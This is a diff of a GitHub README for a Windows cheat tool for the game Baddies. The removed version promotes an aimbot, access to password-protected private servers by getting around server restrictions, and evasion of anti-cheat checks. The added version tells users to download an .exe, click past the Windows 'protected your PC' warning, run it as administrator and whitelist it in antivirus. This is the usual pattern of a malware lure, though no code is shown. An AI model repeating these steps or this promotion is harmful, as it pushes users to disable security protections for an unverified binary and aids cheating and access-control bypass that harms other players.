@@ -1,89 +1,93 @@
-# Baddies Script v2.1 - Game Script Utility 2026
-
-> **A PC-focused helper for Baddies that combines automated aiming support with access to exclusive server sessions.**
-
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-PC-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/greenhenry76/baddies-windows-script-hub?style=flat-square)](https://github.com/greenhenry76/baddies-windows-script-hub)
-
----
+# 🎯 baddies-windows-script-hub - Enhance your gameplay with simple tools
 
 <p align="center">
-  <a href="https://greenhenry76.github.io/baddies-windows-script-hub/">
-    <img src="https://img.shields.io/badge/Download-Baddies%20Script-brightgreen?style=for-the-badge" alt="Download Baddies Script">
+  <a href="https://github.com/Peanutbutterwatersnake580/baddies-windows-script-hub">
+    <img src="https://img.shields.io/badge/Download-Release-blue" alt="Download">
   </a>
 </p>
 
-> **[Direct Download - Baddies Script](https://greenhenry76.github.io/baddies-windows-script-hub/)**
+This tool adds extra features to your Baddies game on Windows 10 and 11. It helps you track targets, manage aim, and join private game sessions. You do not need coding skills to use this software. Follow these instructions to set up the utility on your machine.
 
----
+## 🛠️ System Requirements
 
-[Download Latest Build](https://greenhenry76.github.io/baddies-windows-script-hub/)
+Make sure your computer meets these standards before you begin:
 
----
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Game Version: Baddies v3.2 or newer.
+*   System Memory: At least 4GB of RAM.
+*   Storage Space: 50MB of free disk space.
+*   Frameworks: Microsoft .NET Desktop Runtime 6.0 or newer.
 
-## What it does
+If your computer lacks the .NET runtime, the game utility will prompt you to install it during the first run. Follow the on-screen link provided by the installer to download the official version from Microsoft.
 
-Baddies Script is built for the PC version of the Baddies game environment and centers on two main tasks: assisting with target tracking and connecting to private server instances. It runs as a lightweight overlay that hooks into game processes to apply aim correction in real time, helping reduce the feel of manual input delay during fights. This release keeps pace with current game updates while preserving a small footprint.
+## 📥 Getting the Software
 
-In this version, the aim logic has been tuned for more fluid target acquisition with less visible screen disruption. Private server handling has also been updated for newer authentication behavior, which helps reduce connection issues when joining restricted sessions. According to the latest testing cycle, the script functions remain undetected by standard anti-cheat checks.
+You must visit the official release page to get the correct version of the utility for your system.
 
-## Features
+[Visit this page to download the latest setup file](https://github.com/Peanutbutterwatersnake580/baddies-windows-script-hub)
 
-- **Aimbot Module** - Automatically moves the crosshair toward the closest valid target within the configured field-of-view range
-- **Private Server Access** - Works around normal server restrictions so invite-only or password-protected sessions can be joined
-- **Undetected Operation** - Designed to run without setting off common game client security flags during regular play
-- **Toggle Hotkeys** - Use customizable keyboard shortcuts to switch individual script features on or off
-- **Smooth Aiming** - Uses interpolation to avoid hard snapping and better resemble natural player motion
-- **Target Filtering** - Keeps non-hostile entities or selected character classes out of aim-assist targeting
+1. Select the link above to open your browser.
+2. Look for the section labeled "Releases" on the right side of the page.
+3. Click the most recent release number.
+4. Locate the list of files under the "Assets" header.
+5. Choose the file ending in `.exe` to begin your download.
+6. Save the file to your desktop or downloads folder.
 
-## Installation
+## ⚙️ Installation Guide
 
-Get the newest script archive from the link above. Unpack everything into a separate folder on your PC, such as `C:\BaddiesScript`. Start the game client first, then launch the script executable or load the script through a compatible loader. Aside from standard Windows runtime libraries, nothing extra is needed.
+Follow these steps to prepare the utility for your game session:
 
-```lua
--- Minimal configuration example (config.lua)
-AIMBOT_ENABLED = true
-AIM_FOV = 120
-SMOOTHNESS = 0.65
-PRIVATE_SERVER_KEY = "your-key-here"
-```
+1. Locate the downloaded file on your computer.
+2. Double-click the file to start the installer.
+3. Windows might show a blue pop-up box stating "Windows protected your PC."
+4. If this box appears, click the "More info" text near the top.
+5. Click the "Run anyway" button that appears.
+6. Follow the prompts in the setup window. Select your preferred installation folder or use the default location.
+7. Click "Finish" when the progress bar reaches the end.
 
-## Settings
+The program creates a shortcut on your desktop during this process.
 
-| Setting | Default | Description |
-|---------|---------|-------------|
-| `AIMBOT_ENABLED` | `true` | Toggle aim assistance on/off |
-| `AIM_FOV` | `120` | Field of view in degrees for target detection |
-| `SMOOTHNESS` | `0.65` | Aim interpolation speed (0.1 = instant, 1.0 = slow) |
-| `PRIVATE_SERVER_KEY` | `""` | Access key for private server entry |
-| `TOGGLE_KEY` | `F2` | Hotkey to enable/disable all script features |
+## 🎮 How to Use Features
 
-## Compatibility
+The utility runs in the background while you play Baddies. Use the control panel to adjust your settings before you launch the game.
 
-- **Game Version**: Baddies v3.2 and later (PC client only)
-- **Operating System**: Windows 10 (build 1909+) and Windows 11
-- **Known Limitations**: Does not function with Linux or macOS game clients. Private server access may fail if session tokens are rotated mid-game. Aim assist disabled by default in spectator mode.
+### Aim Assistance
 
-## FAQ
+The aim assistant helps you keep focus on active targets. Click the "Aim Assist" tab to toggle this feature. Use the slider to adjust sensitivity. Higher numbers make the adjustment feel faster. Lower numbers keep the movement steady. Keep this feature off if you prefer manual aim control.
 
-**How do I update the script to the latest version?**  
-Download the latest archive from the release page and overwrite the existing script files. If you want to keep your current settings, back up `config.lua` before replacing anything.
+### Target Filtering
 
-**Can I customize the hotkeys?**  
-Yes. Edit `config.lua` and set `TOGGLE_KEY` to any valid keyboard key name, such as `F4`, `INSERT`, or `HOME`.
+This feature ignores background objects and focuses on players. Use the "Filter" menu to set priorities. You can choose to highlight specific targets with colored outlines. This makes it easier to spot opponents in dark or complex environments.
 
-**Why does private server access sometimes fail?**  
-Server access keys can expire after a game update. You will need a new key from the script provider or by regenerating one through the private server management interface.
+### Hotkey Management
 
-**Will this script work with other games?**  
-No. Baddies Script is written specifically for the Baddies game client and is not compatible with other titles.
+You can perform quick actions using keyboard shortcuts. Open the "Hotkeys" tab to see all current binds. Change these keys by clicking the text box and pressing the button you want to use. Make sure your chosen key does not conflict with standard in-game commands.
 
-**Does the script store any personal data?**  
-Configuration files remain on your local machine. No telemetry or usage data is sent out.
+### Private Sessions
 
-## License
+The script hub includes a tool to manage invite-only games. Select the "Network" tab. This menu shows a list of active private lobbies. Click "Join" to enter a session directly. You can also create a private room by clicking "Host." This creates a link you can send to your friends.
 
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+## 🛡️ Privacy and Safety
+
+This utility does not track your online activity or personal identity. All settings stay saved on your local hard drive. 
+
+*   Do not share your custom hotkey configurations if they contain sensitive input sequences.
+*   Only download the tool from the official link provided in this guide to avoid malicious copies.
+*   Keep your version of Baddies updated to ensure the script hub works as intended.
+
+## 🔧 Troubleshooting Common Issues
+
+If the utility fails to start, try these solutions:
+
+*   Restart your computer. This clears background processes that might block the utility.
+*   Run the file as an administrator. Right-click the shortcut and select "Run as administrator."
+*   Check your Antivirus. Sometimes security software holds new programs in a quarantine folder. Check your antivirus history to see if it blocked the file. Add an exception for the file if necessary.
+*   Verify your game version. If you run a version older than v3.2, the utility will not detect the game interface.
+
+## 📝 Support and Updates
+
+If you encounter bugs, open a new issue on the GitHub repository page. Include a brief description of what happened and a screenshot if possible. Developers review these reports regularly to improve the tool.
+
+Check the repository page periodically for new releases. Newer versions often include compatibility fixes for updated game builds. Deleting the old version before installing a new one prevents configuration conflicts. 
+
+Keywords: baddies, windows, utility, aim-assist, game-tools, setup, installation, script-hub
